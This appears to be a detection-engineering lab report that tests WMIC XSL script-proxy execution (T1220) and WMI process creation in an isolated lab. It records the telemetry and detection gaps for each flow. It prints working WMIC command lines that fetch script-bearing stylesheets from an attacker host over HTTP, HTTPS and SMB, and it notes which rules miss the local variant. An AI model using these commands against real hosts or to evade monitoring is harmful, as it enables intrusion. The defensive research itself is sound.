# WMIC XSL script-processing scenarios

## Scope

- **VM 100 — `kalivm` — `192.168.1.50` — attacker and stylesheet host.**
  Lab-authored benign XSL was served over HTTP on TCP 18082/18083, HTTPS on
  TCP 18443, and the read-only guest SMB share `wmicxsl` on TCP 445. Each
  listener bound only to `192.168.1.50`. `certutil.lab` was a temporary
  hosts-file name for `192.168.1.50` during the HTTPS flow.
- **VM 104 — `WIN10-ANALYSIS` — `192.168.1.52` — target.** Every run began
  and ended with rollback to `win_verify_baseline`. Flow 1 used a disposable
  standard user at medium integrity. Flow 4's `/node:` destination was VM
  104's own lab address, `192.168.1.52`.
- **VM 106 — `nsm` — recorded address `10.9.0.20` — offline analysis only.**
  It was never a run-traffic destination. Every completed unfiltered pktmon
  capture was processed by `nsm-analyze` with Zeek, Suricata, and JA3.
- **Permitted attack destinations.** Only `192.168.1.50:18082`,
  `192.168.1.50:18083`, `192.168.1.50:18443`, `192.168.1.50:445`, and the
  target's own `192.168.1.52` address. All are inside `192.168.1.0/24`.
  Public destinations and `10.9.0.0/24` were forbidden.
- **Payloads and tools.** Every stylesheet and the HTTPS helper in
  `fixtures/` was written for this verification and does nothing except
  launch `cmd.exe` to write a benign marker. Kali's installed Samba served
  the committed read-only share configuration. `wmic.exe`, `cmd.exe`, Task
  Scheduler, and the scripting engines are target OS components. No
  third-party attack code was used.
- **Safety evidence.** Each flow has a distinct operator command record and
  post-run `check-lab-scope.py` output under `evidence/safety/`. The checker
  received every planted binary/script via `--tool-image`; OS/Defender
  traffic is retained in manifests but is not attributed to the tool. Every
  accepted-flow post-run verdict is `PASS`.

WMIC can apply XSL to command output through `/format:`. Script embedded with
`ms:script` turns that signed utility into a script execution proxy, mapping
to **XSL Script Processing (T1220)**.

## Flow 0: remote HTTP JScript XSL

```text
C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"http://192.168.1.50:18082/wmic-jscript-http.xsl"
```

Result: exit 0; JScript wrote `benign-http-jscript`. WMIC made the HTTP
connection, the XSL was cached, JScript telemetry was set, and WMIC directly
spawned the marker-writing `cmd.exe`. This re-runs the historical baseline
under the current safety model.

## Flow 1: local user-writable JScript XSL as a standard user

```text
C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"C:\Users\WmicLabUser\AppData\Local\Temp\wmic-jscript-local.xsl"
```

Result: task result 0; the disposable non-administrator ran at medium
integrity and wrote `benign-local-jscript`. Process `/format:`, WMIC-to-cmd
ancestry, the local stylesheet/marker, and JScript registry telemetry
survived. The upstream remote `/format:` rule, both HTTP rules, endpoint
network, SMB, and Internet-cache rules went blind. The capture contained no
attack-attributed network activity.

## Flow 2: SMB-hosted JScript XSL

```text
C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"\\192.168.1.50\wmicxsl\wmic-jscript-smb.xsl"
```

Result: exit 0 and marker `benign-smb-jscript`. Zeek recorded TCP 445,
guest/NTLM session setup, the `wmicxsl` DISK share mapping, and a 606-byte
stylesheet open. There was no HTTP record or Internet-cache XSL. The adopted
remote `/format:` process rule and parent-child/JScript signals survived.

## Flow 3: local WMI process creation — adjacent T1047

```text
C:\Windows\System32\wbem\WMIC.exe process call create "cmd.exe /c echo benign-process-create>C:\lab\wmic-process-create-marker.txt"
```

Result: WMIC returned `ReturnValue = 0` and created the marker. The created
`cmd.exe` was parented by `WmiPrvSE.exe`, not WMIC. No attack-attributed
network or relevant registry signal appeared. This is **WMI process
execution (T1047), not T1220**; it is an adjacent use-case included because
the news corpus actually documents this form.

## Flow 4: `/node:` against the target's own lab address

```text
C:\Windows\System32\wbem\WMIC.exe /node:192.168.1.52 os get Caption
```

Result: exit 0 and the expected Windows caption. Contrary to the planned
DCOM exercise, Windows optimized its own address locally: Zeek saw no DCOM
TCP connection and Sysmon saw no WMIC-attributed network connection. The
only distinguishing signal was the `/node:` command line. A credentialed
self attempt failed with `User credentials cannot be used for local
connections`; its safety output and transparent local-name readjudication are
retained. This negative result means a `/node:` command alone does not prove
lateral movement.

## Flow 5: remote HTTP VBScript XSL

```text
C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"http://192.168.1.50:18083/wmic-vbscript-http.xsl"
```

Result: exit 0 and marker `benign-http-vbscript`. Retrieval, cache, process,
and direct WMIC-to-cmd shapes matched JScript, while Windows Script telemetry
changed to `VBScriptSetScriptStateStarted`. The benign flow 4 query also set
that VBScript value, so a broad VBScript registry rule would be noisy and was
not authored.

## Flow 6: HTTPS JScript XSL

```text
C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"https://certutil.lab:18443/wmic-jscript-https.xsl"
```

Result: exit 0 and marker `benign-https-jscript`. Zeek recorded TLS 1.2, SNI
`certutil.lab`, the disposable self-signed certificate, JA3
`a0e9f5d64349fb13191bc781f81f42e1`, and JA3S
`ec74a5c51106f0419184d0dd08fb05bc`. HTTP content was correctly opaque, while
endpoint cache, JScript, process, and child signals remained. No TLS rule was
authored: the observed fingerprints describe the shared Windows client stack
and lab server, not WMIC-specific behavior.

## Grounding and priority

The audit VM's committed scenario-reference builder
(`evidence/scenario-reference.json`) was initially queried with the technique
slug and returned zero LOLBAS matches. That is a query-alias limitation, not a
grounding result: the current LOLBAS `Wmic.exe` entry explicitly documents
remote URL and SMB `/format:` XSL, local `process call create`, remote
`/node:` process creation, and ADS process creation. The daily-news result is
separate and remains **zero cases**. The cited audit finding over 954
daily-news files reports zero files for `xsl` or `XSL`; it does show
`wmic process call create` and `/node:`, while
`mshta` occurs in 33 files and `rundll32` in 12. Those adjacent forms are not
inflated into T1220 coverage.

Remote WMIC XSL therefore deserves lower current detection-engineering
priority than WMIC process creation and remote `/node:` usage, and lower
ecosystem priority than better-grounded `mshta` and `rundll32` proxy
execution. These XSL runs measure telemetry gaps; they do not establish
prevalence.

## Limits

- The single-Windows-host workgroup lab cannot reproduce cross-host or
  domain-authenticated WMI. The self-node negative result must not be
  generalized to a real remote target.
- `msxsl.exe` is not built in and was outside this LOLBIN verification.
- LOLBAS ADS process creation (`process call create` with an alternate data
  stream executable) is runnable in this lab but was outside the requested
  flows. It is a future T1564.004/T1047 scenario and is not counted as covered.
- SigmaHQ image-load ID `06ce37c2-61ab-4f05-9ff5-b1a96d18ae32` covers
  `jscript.dll`/`vbscript.dll` loading by WMIC, but the baseline Sysmon config
  does not collect EID 7. Enabling a WMIC-scoped image-load filter and
  measuring that upstream rule is a future, uncounted T1220 scenario.
- Changing the queried WMIC alias may alter output without changing the
  `/format:` script-processing primitive.
